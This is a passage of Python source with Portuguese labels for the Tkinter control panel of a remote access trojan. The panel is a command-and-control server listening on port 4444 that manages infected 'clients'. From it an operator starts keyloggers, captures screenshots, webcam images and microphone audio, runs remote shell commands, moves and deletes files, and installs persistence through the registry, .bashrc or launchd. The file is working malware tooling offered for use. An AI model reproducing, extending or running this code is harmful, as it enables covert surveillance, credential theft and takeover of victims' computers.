        self.btn_parar = ttk.Button(btn_frame, text="⏹ Parar Servidor", command=self.parar_servidor, state='disabled')
        self.btn_parar.pack(side='left', padx=2)
        
        # Notebook
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=5)
        
        # Abas
        self.aba_clientes = ttk.Frame(self.notebook)
        self.notebook.add(self.aba_clientes, text="📋 Clientes")
        self.criar_aba_clientes()
        
        self.aba_console = ttk.Frame(self.notebook)
        self.notebook.add(self.aba_console, text="💻 Console")
        self.criar_aba_console()
        
        self.aba_arquivos = ttk.Frame(self.notebook)
        self.notebook.add(self.aba_arquivos, text="📁 Arquivos")
        self.criar_aba_arquivos()
        
        self.aba_keylogger = ttk.Frame(self.notebook)
        self.notebook.add(self.aba_keylogger, text="⌨️ Keylogger")
        self.criar_aba_keylogger()
        
        self.aba_midia = ttk.Frame(self.notebook)
        self.notebook.add(self.aba_midia, text="🎥 Mídia")
        self.criar_aba_midia()
        
        self.aba_info = ttk.Frame(self.notebook)
        self.notebook.add(self.aba_info, text="ℹ️ Info")
        self.criar_aba_info()
        
        self.aba_persist = ttk.Frame(self.notebook)
        self.notebook.add(self.aba_persist, text="🔒 Persistência")
        self.criar_aba_persist()
        
        # Status bar
        self.status_bar = tk.Label(self.root, text="Pronto", 
                                   font=('Arial', 9), fg='#888', bg='#1a1a2e')
        self.status_bar.pack(fill='x', padx=10, pady=5)
    
    # ================================================================
    # ABA CLIENTES
    # ================================================================
    def criar_aba_clientes(self):
        left_frame = ttk.Frame(self.aba_clientes)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(left_frame, text="Clientes Conectados:", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        colunas = ('ID', 'Hostname', 'Usuário', 'Sistema', 'IP', 'Status')
        self.tree_clientes = ttk.Treeview(left_frame, columns=colunas, show='headings', height=12)
        for col in colunas:
            self.tree_clientes.heading(col, text=col)
            self.tree_clientes.column(col, width=100)
        self.tree_clientes.column('ID', width=140)
        self.tree_clientes.column('Hostname', width=120)
        self.tree_clientes.column('Sistema', width=100)
        self.tree_clientes.column('IP', width=120)
        self.tree_clientes.pack(fill='both', expand=True)
        self.tree_clientes.bind('<<TreeviewSelect>>', self.on_cliente_selecionado)
        
        btn_frame = ttk.Frame(left_frame)
        btn_frame.pack(fill='x', pady=5)
        ttk.Button(btn_frame, text="🔄 Atualizar", command=self.atualizar_lista_clientes).pack(side='left', padx=2)
        ttk.Button(btn_frame, text="📊 Info", command=self.coletar_info_cliente).pack(side='left', padx=2)
        ttk.Button(btn_frame, text="🔌 Desconectar", command=self.desconectar_cliente).pack(side='left', padx=2)
        ttk.Button(btn_frame, text="🕵️ Spyware", command=self.abrir_spyware).pack(side='left', padx=2)
        
        right_frame = ttk.Frame(self.aba_clientes)
        right_frame.pack(side='right', fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(right_frame, text="Info do Cliente:", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        self.info_cliente_text = scrolledtext.ScrolledText(right_frame, height=10, 
                                                           bg='#16213e', fg='#e0e0e0',
                                                           insertbackground='#e0e0e0')
        self.info_cliente_text.pack(fill='both', expand=True)
        
        tk.Label(right_frame, text="Comandos Rápidos:", 
                font=('Arial', 10, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w', pady=(10,0))
        
        cmd_frame = ttk.Frame(right_frame)
        cmd_frame.pack(fill='x', pady=5)
        
        for texto, comando in [
            ("📸 Screenshot", self.cmd_screenshot),
            ("🎥 Webcam", self.cmd_webcam),
            ("🎤 Microfone", self.cmd_microfone),
            ("⌨️ Keylogger", self.cmd_keylogger_iniciar),
            ("📋 Info", self.cmd_info),
            ("🕵️ Spyware", self.abrir_spyware)
        ]:
            ttk.Button(cmd_frame, text=texto, command=comando).pack(side='left', padx=2)
        
        custom_frame = ttk.Frame(right_frame)
        custom_frame.pack(fill='x', pady=5)
        tk.Label(custom_frame, text="Comando:", fg='#e0e0e0', bg='#1a1a2e').pack(side='left')
        self.entry_comando = ttk.Entry(custom_frame)
        self.entry_comando.pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(custom_frame, text="▶ Enviar", command=self.enviar_comando_custom).pack(side='left')
    
    def abrir_spyware(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        if id_cliente not in self.clientes:
            messagebox.showwarning("Aviso", "Cliente desconectado!")
            return
        
        # Verifica se já existe uma janela para este cliente
        for janela in self.janelas_spyware:
            if janela.id_cliente == id_cliente and janela.monitor_ativo:
                janela.janela.lift()
                return
        
        # Cria nova janela
        janela = JanelaSpyware(self.root, id_cliente, self.enviar_e_receber)
        self.janelas_spyware.append(janela)
    
    # ================================================================
    # ABA CONSOLE
    # ================================================================
    def criar_aba_console(self):
        frame = ttk.Frame(self.aba_console)
        frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(frame, text="Console Remoto", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        self.console_output = scrolledtext.ScrolledText(frame, height=20,
                                                        bg='#0a0a1a', fg='#00ff41',
                                                        font=('Consolas', 10),
                                                        insertbackground='#00ff41')
        self.console_output.pack(fill='both', expand=True)
        self.console_output.insert('end', ">>> Console pronto. Selecione um cliente.\n")
        self.console_output.config(state='disabled')
        
        input_frame = ttk.Frame(frame)
        input_frame.pack(fill='x', pady=5)
        self.console_input = ttk.Entry(input_frame)
        self.console_input.pack(side='left', fill='x', expand=True, padx=5)
        self.console_input.bind('<Return>', lambda e: self.executar_console_comando())
        ttk.Button(input_frame, text="▶ Executar", command=self.executar_console_comando).pack(side='left')
    
    # ================================================================
    # ABA ARQUIVOS
    # ================================================================
    def criar_aba_arquivos(self):
        frame = ttk.Frame(self.aba_arquivos)
        frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(frame, text="Gerenciador de Arquivos", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        path_frame = ttk.Frame(frame)
        path_frame.pack(fill='x', pady=5)
        tk.Label(path_frame, text="Caminho:", fg='#e0e0e0', bg='#1a1a2e').pack(side='left')
        self.entry_path = ttk.Entry(path_frame)
        self.entry_path.pack(side='left', fill='x', expand=True, padx=5)
        self.entry_path.insert(0, ".")
        ttk.Button(path_frame, text="📂 Listar", command=self.listar_arquivos_gui).pack(side='left')
        
        self.arquivos_tree = ttk.Treeview(frame, columns=('Nome', 'Tipo', 'Tamanho'), show='headings', height=15)
        self.arquivos_tree.heading('Nome', text='Nome')
        self.arquivos_tree.heading('Tipo', text='Tipo')
        self.arquivos_tree.heading('Tamanho', text='Tamanho')
        self.arquivos_tree.column('Nome', width=300)
        self.arquivos_tree.column('Tipo', width=80)
        self.arquivos_tree.column('Tamanho', width=100)
        self.arquivos_tree.pack(fill='both', expand=True)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill='x', pady=5)
        ttk.Button(btn_frame, text="📥 Download", command=self.download_arquivo_gui).pack(side='left', padx=2)
        ttk.Button(btn_frame, text="📤 Upload", command=self.upload_arquivo_gui).pack(side='left', padx=2)
        ttk.Button(btn_frame, text="🗑️ Deletar", command=self.delete_arquivo_gui).pack(side='left', padx=2)
        ttk.Button(btn_frame, text="✏️ Renomear", command=self.rename_arquivo_gui).pack(side='left', padx=2)
    
    # ================================================================
    # ABA KEYLOGGER
    # ================================================================
    def criar_aba_keylogger(self):
        frame = ttk.Frame(self.aba_keylogger)
        frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(frame, text="Keylogger - Captura de Teclas", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        self.keylogger_status = tk.Label(frame, text="⏹ Parado", 
                                         font=('Arial', 10), fg='#ff6b6b', bg='#1a1a2e')
        self.keylogger_status.pack(anchor='w', pady=5)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill='x', pady=5)
        ttk.Button(btn_frame, text="▶ Iniciar Keylogger", 
                  command=self.cmd_keylogger_iniciar).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="⏹ Parar e Coletar", 
                  command=self.cmd_keylogger_parar).pack(side='left', padx=5)
        
        tk.Label(frame, text="Teclas Capturadas:", font=('Arial', 10, 'bold'), 
                fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w', pady=(10,0))
        
        self.keylogger_output = scrolledtext.ScrolledText(frame, height=15,
                                                          bg='#16213e', fg='#00ff41',
                                                          font=('Consolas', 10),
                                                          insertbackground='#00ff41')
        self.keylogger_output.pack(fill='both', expand=True)
        self.keylogger_output.insert('end', "Aguardando início do keylogger...\n")
        self.keylogger_output.config(state='disabled')
    
    # ================================================================
    # ABA MÍDIA
    # ================================================================
    def criar_aba_midia(self):
        frame = ttk.Frame(self.aba_midia)
        frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(frame, text="Áudio e Vídeo", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        btn_frame1 = ttk.Frame(frame)
        btn_frame1.pack(fill='x', pady=5)
        ttk.Button(btn_frame1, text="📸 Screenshot", command=self.cmd_screenshot).pack(side='left', padx=5)
        ttk.Button(btn_frame1, text="🎥 Webcam", command=self.cmd_webcam).pack(side='left', padx=5)
        
        mic_frame = ttk.Frame(frame)
        mic_frame.pack(fill='x', pady=5)
        tk.Label(mic_frame, text="Duração (seg):", fg='#e0e0e0', bg='#1a1a2e').pack(side='left')
        self.entry_duracao = ttk.Entry(mic_frame, width=10)
        self.entry_duracao.pack(side='left', padx=5)
        self.entry_duracao.insert(0, "10")
        ttk.Button(mic_frame, text="🎤 Gravar Áudio", command=self.cmd_microfone).pack(side='left', padx=5)
        
        self.midia_progress = ttk.Progressbar(frame, mode='indeterminate', length=200)
        self.midia_progress.pack(fill='x', pady=5)
        
        self.midia_log = scrolledtext.ScrolledText(frame, height=10,
                                                   bg='#16213e', fg='#e0e0e0',
                                                   insertbackground='#e0e0e0')
        self.midia_log.pack(fill='both', expand=True, pady=5)
    
    # ================================================================
    # ABA INFO
    # ================================================================
    def criar_aba_info(self):
        frame = ttk.Frame(self.aba_info)
        frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(frame, text="Informações do Sistema", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        ttk.Button(frame, text="📊 Coletar Info", command=self.cmd_info).pack(anchor='w', pady=5)
        
        self.info_output = scrolledtext.ScrolledText(frame, height=20,
                                                     bg='#16213e', fg='#e0e0e0',
                                                     insertbackground='#e0e0e0')
        self.info_output.pack(fill='both', expand=True)
    
    # ================================================================
    # ABA PERSISTÊNCIA
    # ================================================================
    def criar_aba_persist(self):
        frame = ttk.Frame(self.aba_persist)
        frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        tk.Label(frame, text="Persistência", 
                font=('Arial', 11, 'bold'), fg='#4ecdc4', bg='#1a1a2e').pack(anchor='w')
        
        info_text = "Instala persistência para iniciar com o sistema:\nWindows: Registry | Linux: .bashrc | Mac: launchd"
        tk.Label(frame, text=info_text, fg='#e0e0e0', bg='#1a1a2e', 
                justify='left', font=('Arial', 10)).pack(anchor='w', pady=10)
        
        ttk.Button(frame, text="🔒 Instalar Persistência", 
                  command=self.cmd_persistencia).pack(anchor='w', pady=5)
        
        self.persist_output = scrolledtext.ScrolledText(frame, height=10,
                                                        bg='#16213e', fg='#e0e0e0',
                                                        insertbackground='#e0e0e0')
        self.persist_output.pack(fill='both', expand=True, pady=5)
    
    # ================================================================
    # FUNÇÕES DO SERVIDOR
    # ================================================================
    def iniciar_servidor(self):
        self.rodando = True
        self.btn_iniciar.config(state='disabled')
        self.btn_parar.config(state='normal')
        self.status_label.config(text="🟢 Servidor ativo", fg='#51cf66')
        self.status_bar.config(text="Servidor iniciado em 0.0.0.0:4444")
        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()
    
    def _run_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', 4444))
        server.listen(5)
        
        while self.rodando:
            try:
                conn, addr = server.accept()
                id_cliente = f"{addr[0]}:{addr[1]}"
                self.clientes[id_cliente] = conn
                self.clientes_info[id_cliente] = {'addr': addr, 'conectado': time.time()}
                self.atualizar_lista_clientes()
                self.log(f"[+] Cliente conectado: {id_cliente}")
                threading.Thread(target=self._handler_cliente, args=(conn, id_cliente), daemon=True).start()
            except:
                break
    
    def _handler_cliente(self, conn, id_cliente):
        try:
            while self.rodando:
                try:
                    dados = conn.recv(8192).decode().strip()
                    if not dados:
                        break
                    try:
                        msg = json.loads(dados)
                        if msg.get('tipo') == 'beacon':
                            self.clientes_info[id_cliente]['info'] = msg
                            self.atualizar_lista_clientes()
                            self.log(f"[+] Beacon de {id_cliente}")
                    except:
                        pass
                except:
                    break
        except:
            pass
        
        if id_cliente in self.clientes:
            del self.clientes[id_cliente]
        if id_cliente in self.clientes_info:
            del self.clientes_info[id_cliente]
        try:
            conn.close()
        except:
            pass
        self.atualizar_lista_clientes()
        self.log(f"[-] Cliente desconectado: {id_cliente}")
    
    def parar_servidor(self):
        self.rodando = False
        self.btn_iniciar.config(state='normal')
        self.btn_parar.config(state='disabled')
        self.status_label.config(text="⚠️ Servidor parado", fg='#ff6b6b')
        self.status_bar.config(text="Servidor parado")
        
        # Fecha todas as janelas spyware
        for janela in self.janelas_spyware:
            try:
                janela.fechar()
            except:
                pass
        self.janelas_spyware.clear()
        
        for conn in self.clientes.values():
            try:
                conn.close()
            except:
                pass
        self.clientes.clear()
        self.clientes_info.clear()
        self.atualizar_lista_clientes()
    
    def enviar_comando(self, id_cliente, comando):
        if id_cliente in self.clientes:
            try:
                self.clientes[id_cliente].send((comando + '\n').encode())
                return True
            except:
                pass
        return False
    
    def enviar_e_receber(self, id_cliente, comando):
        if not self.enviar_comando(id_cliente, comando):
            return "[ERRO] Falha ao enviar comando"
        try:
            self.clientes[id_cliente].settimeout(60)
            resp = self.clientes[id_cliente].recv(8192).decode().strip()
            self.clientes[id_cliente].settimeout(None)
            try:
                resp_json = json.loads(resp)
                return resp_json.get('resultado', resp)
            except:
                return resp
        except socket.timeout:
            return "[ERRO] Timeout"
        except:
            return "[ERRO] Falha na resposta"
    
    def get_cliente_selecionado(self):
        selection = self.tree_clientes.selection()
        if selection:
            item = self.tree_clientes.item(selection[0])
            return item['values'][0]
        return None
    
    # ================================================================
    # FUNÇÕES DE COMANDO - THREAD ASSÍNCRONA
    # ================================================================
    def _executar_comando_async(self, comando_func, callback=None, *args):
        def tarefa():
            try:
                if hasattr(self, 'midia_progress'):
                    self.midia_progress.start(10)
                resultado = comando_func(*args)
                if hasattr(self, 'midia_progress'):
                    self.midia_progress.stop()
                if callback:
                    self.root.after(0, callback, resultado)
            except Exception as e:
                if hasattr(self, 'midia_progress'):
                    self.midia_progress.stop()
                if callback:
                    self.root.after(0, callback, f"[ERRO] {str(e)}")
        
        thread = threading.Thread(target=tarefa, daemon=True)
        thread.start()
    
    # ================================================================
    # COMANDOS
    # ================================================================
    def cmd_keylogger_iniciar(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        self.keylogger_status.config(text="🟢 Keylogger ATIVO", fg='#51cf66')
        self.keylogger_output.config(state='normal')
        self.keylogger_output.delete('1.0', 'end')
        self.keylogger_output.insert('end', "▶ Iniciando keylogger...\n")
        self.keylogger_output.config(state='disabled')
        
        def callback(resultado):
            self.keylogger_output.config(state='normal')
            self.keylogger_output.insert('end', f"\n{resultado}\n")
            self.keylogger_output.config(state='disabled')
            self.log(f"Keylogger iniciado em {id_cliente}")
        
        self._executar_comando_async(
            self.enviar_e_receber, 
            callback,
            id_cliente, "keylogger_start"
        )
    
    def cmd_keylogger_parar(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        self.keylogger_status.config(text="⏹ Parando...", fg='#ff6b6b')
        
        def callback(resultado):
            self.keylogger_status.config(text="⏹ Parado", fg='#ff6b6b')
            self.keylogger_output.config(state='normal')
            self.keylogger_output.delete('1.0', 'end')
            self.keylogger_output.insert('end', "📋 TECLAS CAPTURADAS:\n")
            self.keylogger_output.insert('end', "="*50 + "\n")
            self.keylogger_output.insert('end', resultado)
            self.keylogger_output.insert('end', "\n" + "="*50 + "\n")
            self.keylogger_output.config(state='disabled')
            self.log(f"Keylogger parado em {id_cliente}")
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, "keylogger_stop"
        )
    
    def cmd_microfone(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        try:
            duracao = int(self.entry_duracao.get())
        except:
            duracao = 10
        
        self.midia_log.delete('1.0', 'end')
        self.midia_log.insert('end', f"🎤 Gravando áudio por {duracao} segundos...\n")
        
        def callback(resultado):
            if resultado and not resultado.startswith('[ERRO]'):
                try:
                    dados = base64.b64decode(resultado)
                    nome = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                    salvar = filedialog.asksaveasfilename(defaultextension=".wav", initialfile=nome)
                    if salvar:
                        with open(salvar, 'wb') as f:
                            f.write(dados)
                        self.midia_log.insert('end', f"✅ Áudio salvo: {salvar}\n")
                        self.midia_log.insert('end', f"📊 Tamanho: {len(dados)/1024:.2f} KB\n")
                    else:
                        self.midia_log.insert('end', "❌ Salvamento cancelado\n")
                except Exception as e:
                    self.midia_log.insert('end', f"❌ Erro ao salvar: {e}\n")
            else:
                self.midia_log.insert('end', f"❌ {resultado}\n")
            self.log(f"Áudio gravado em {id_cliente}")
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, f"microphone {duracao}"
        )
    
    def cmd_screenshot(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        self.midia_log.delete('1.0', 'end')
        self.midia_log.insert('end', "📸 Capturando screenshot...\n")
        
        def callback(resultado):
            if resultado and not resultado.startswith('[ERRO]'):
                try:
                    dados = base64.b64decode(resultado)
                    nome = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                    salvar = filedialog.asksaveasfilename(defaultextension=".png", initialfile=nome)
                    if salvar:
                        with open(salvar, 'wb') as f:
                            f.write(dados)
                        self.midia_log.insert('end', f"✅ Screenshot salvo: {salvar}\n")
                        self.midia_log.insert('end', f"📊 Tamanho: {len(dados)/1024:.2f} KB\n")
                    else:
                        self.midia_log.insert('end', "❌ Salvamento cancelado\n")
                except Exception as e:
                    self.midia_log.insert('end', f"❌ Erro: {e}\n")
            else:
                self.midia_log.insert('end', f"❌ {resultado}\n")
            self.log(f"Screenshot capturado em {id_cliente}")
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, "screenshot"
        )
    
    def cmd_webcam(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        self.midia_log.delete('1.0', 'end')
        self.midia_log.insert('end', "🎥 Capturando webcam...\n")
        
        def callback(resultado):
            if resultado and not resultado.startswith('[ERRO]'):
                try:
                    dados = base64.b64decode(resultado)
                    nome = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    salvar = filedialog.asksaveasfilename(defaultextension=".jpg", initialfile=nome)
                    if salvar:
                        with open(salvar, 'wb') as f:
                            f.write(dados)
                        self.midia_log.insert('end', f"✅ Webcam capturada: {salvar}\n")
                        self.midia_log.insert('end', f"📊 Tamanho: {len(dados)/1024:.2f} KB\n")
                    else:
                        self.midia_log.insert('end', "❌ Salvamento cancelado\n")
                except Exception as e:
                    self.midia_log.insert('end', f"❌ Erro: {e}\n")
            else:
                self.midia_log.insert('end', f"❌ {resultado}\n")
            self.log(f"Webcam capturada em {id_cliente}")
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, "webcam"
        )
    
    def cmd_info(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        self.info_output.delete('1.0', 'end')
        self.info_output.insert('end', "📊 Coletando informações...\n")
        
        def callback(resultado):
            if resultado:
                try:
                    dados = json.loads(resultado)
                    texto = json.dumps(dados, indent=2)
                    self.info_output.delete('1.0', 'end')
                    self.info_output.insert('end', texto)
                except:
                    self.info_output.delete('1.0', 'end')
                    self.info_output.insert('end', resultado)
            self.log(f"Info coletada de {id_cliente}")
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, "info"
        )
    
    def cmd_persistencia(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        if not messagebox.askyesno("Confirmar", "Instalar persistência no cliente?"):
            return
        
        self.persist_output.delete('1.0', 'end')
        self.persist_output.insert('end', "🔒 Instalando persistência...\n")
        
        def callback(resultado):
            self.persist_output.insert('end', resultado)
            self.log(f"Persistência instalada em {id_cliente}")
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, "persist"
        )
    
    # ================================================================
    # FUNÇÕES DA GUI - CLIENTES
    # ================================================================
    def atualizar_lista_clientes(self):
        for item in self.tree_clientes.get_children():
            self.tree_clientes.delete(item)
        
        for id_c, info in self.clientes_info.items():
            dados = info.get('info', {})
            status = "🟢 Online" if id_c in self.clientes else "🔴 Offline"
            self.tree_clientes.insert('', 'end', values=(
                id_c,
                dados.get('hostname', 'N/A'),
                dados.get('usuario', 'N/A'),
                dados.get('sistema', 'N/A'),
                dados.get('ip', 'N/A'),
                status
            ))
    
    def on_cliente_selecionado(self, event):
        id_cliente = self.get_cliente_selecionado()
        if id_cliente and id_cliente in self.clientes_info:
            info = self.clientes_info[id_cliente].get('info', {})
            texto = f"ID: {id_cliente}\n"
            texto += f"Hostname: {info.get('hostname', 'N/A')}\n"
            texto += f"Usuário: {info.get('usuario', 'N/A')}\n"
            texto += f"Sistema: {info.get('sistema', 'N/A')}\n"
            texto += f"IP: {info.get('ip', 'N/A')}\n"
            texto += f"Conectado: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.clientes_info[id_cliente].get('conectado', 0)))}\n"
            self.info_cliente_text.delete('1.0', 'end')
            self.info_cliente_text.insert('1.0', texto)
    
    def coletar_info_cliente(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        def callback(resultado):
            if resultado:
                try:
                    dados = json.loads(resultado)
                    texto = json.dumps(dados, indent=2)
                    self.info_cliente_text.delete('1.0', 'end')
                    self.info_cliente_text.insert('1.0', texto)
                except:
                    self.info_cliente_text.delete('1.0', 'end')
                    self.info_cliente_text.insert('1.0', resultado)
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, "info"
        )
    
    def desconectar_cliente(self):
        id_cliente = self.get_cliente_selecionado()
        if id_cliente and id_cliente in self.clientes:
            try:
                self.clientes[id_cliente].close()
            except:
                pass
            del self.clientes[id_cliente]
            if id_cliente in self.clientes_info:
                del self.clientes_info[id_cliente]
            self.atualizar_lista_clientes()
            self.log(f"[*] Cliente desconectado: {id_cliente}")
    
    def enviar_comando_custom(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        comando = self.entry_comando.get()
        if not comando:
            messagebox.showwarning("Aviso", "Digite um comando!")
            return
        
        def callback(resultado):
            self.info_cliente_text.delete('1.0', 'end')
            self.info_cliente_text.insert('1.0', f"Comando: {comando}\n\n{resultado}")
            self.log(f"Comando enviado: {comando}")
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, comando
        )
    
    # ================================================================
    # CONSOLE
    # ================================================================
    def log_console(self, texto):
        self.console_output.config(state='normal')
        self.console_output.insert('end', texto + '\n')
        self.console_output.see('end')
        self.console_output.config(state='disabled')
    
    def executar_console_comando(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            self.log_console("[ERRO] Selecione um cliente primeiro!")
            return
        comando = self.console_input.get()
        if not comando:
            return
        self.console_input.delete(0, 'end')
        self.log_console(f"C2> {comando}")
        
        def callback(resultado):
            if resultado:
                self.log_console(resultado)
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, f"shell {comando}"
        )
    
    # ================================================================
    # ARQUIVOS
    # ================================================================
    def listar_arquivos_gui(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        caminho = self.entry_path.get()
        
        def callback(resultado):
            for item in self.arquivos_tree.get_children():
                self.arquivos_tree.delete(item)
            if resultado:
                try:
                    dados = json.loads(resultado)
                    for item in dados:
                        self.arquivos_tree.insert('', 'end', values=(
                            item['nome'],
                            item['tipo'],
                            f"{item['tamanho']} bytes"
                        ))
                except:
                    messagebox.showerror("Erro", resultado)
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, f"ls {caminho}"
        )
    
    def download_arquivo_gui(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        selection = self.arquivos_tree.selection()
        if not selection:
            messagebox.showwarning("Aviso", "Selecione um arquivo!")
            return
        
        item = self.arquivos_tree.item(selection[0])
        nome = item['values'][0]
        tipo = item['values'][1]
        
        if tipo == 'DIR':
            messagebox.showwarning("Aviso", "Não é possível baixar diretórios!")
            return
        
        caminho = self.entry_path.get()
        caminho_completo = os.path.join(caminho, nome) if caminho != '.' else nome
        
        def callback(resultado):
            if resultado and not resultado.startswith('[ERRO]'):
                try:
                    dados = base64.b64decode(resultado)
                    salvar = filedialog.asksaveasfilename(defaultextension=".bin", initialfile=nome)
                    if salvar:
                        with open(salvar, 'wb') as f:
                            f.write(dados)
                        messagebox.showinfo("Sucesso", f"Arquivo salvo: {salvar}")
                except:
                    messagebox.showerror("Erro", "Falha ao salvar arquivo")
            else:
                messagebox.showerror("Erro", resultado)
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, f"download {caminho_completo}"
        )
    
    def upload_arquivo_gui(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        arquivo = filedialog.askopenfilename()
        if not arquivo:
            return
        
        nome = os.path.basename(arquivo)
        caminho_remoto = input(f"Caminho remoto (Enter para {nome}): ")
        if not caminho_remoto:
            caminho_remoto = nome
        
        try:
            with open(arquivo, 'rb') as f:
                dados_b64 = base64.b64encode(f.read()).decode()
            
            def callback(resultado):
                messagebox.showinfo("Resultado", resultado)
                self.listar_arquivos_gui()
            
            self._executar_comando_async(
                self.enviar_e_receber,
                callback,
                id_cliente, f"upload {caminho_remoto},{dados_b64}"
            )
        except Exception as e:
            messagebox.showerror("Erro", str(e))
    
    def delete_arquivo_gui(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        selection = self.arquivos_tree.selection()
        if not selection:
            messagebox.showwarning("Aviso", "Selecione um arquivo!")
            return
        
        item = self.arquivos_tree.item(selection[0])
        nome = item['values'][0]
        caminho = self.entry_path.get()
        caminho_completo = os.path.join(caminho, nome) if caminho != '.' else nome
        
        if not messagebox.askyesno("Confirmar", f"Deletar {caminho_completo}?"):
            return
        
        def callback(resultado):
            messagebox.showinfo("Resultado", resultado)
            self.listar_arquivos_gui()
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, f"delete {caminho_completo}"
        )
    
    def rename_arquivo_gui(self):
        id_cliente = self.get_cliente_selecionado()
        if not id_cliente:
            messagebox.showwarning("Aviso", "Selecione um cliente primeiro!")
            return
        
        selection = self.arquivos_tree.selection()
        if not selection:
            messagebox.showwarning("Aviso", "Selecione um arquivo!")
            return
        
        item = self.arquivos_tree.item(selection[0])
        nome = item['values'][0]
        caminho = self.entry_path.get()
        caminho_completo = os.path.join(caminho, nome) if caminho != '.' else nome
        
        novo_nome = input(f"Novo nome para {nome}: ")
        if not novo_nome:
            return
        
        def callback(resultado):
            messagebox.showinfo("Resultado", resultado)
            self.listar_arquivos_gui()
        
        self._executar_comando_async(
            self.enviar_e_receber,
            callback,
            id_cliente, f"rename {caminho_completo},{novo_nome}"
        )
    
    # ================================================================
    # AUXILIARES
    # ================================================================
    def log(self, mensagem):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.status_bar.config(text=f"[{timestamp}] {mensagem}")
    
    def run(self):
        self.root.mainloop()

# ===================================================================
# MENU PRINCIPAL
# ===================================================================
def limpar_tela():
    os.system('cls' if os.name == 'nt' else 'clear')

def menu_principal():
    limpar_tela()
    print(f"""
{Cores.VERMELHO}{Cores.NEGRITO}
   ╔══════════════════════════════════════════════════════════════╗
   ║     ██████╗  █████╗ ████████╗                              ║
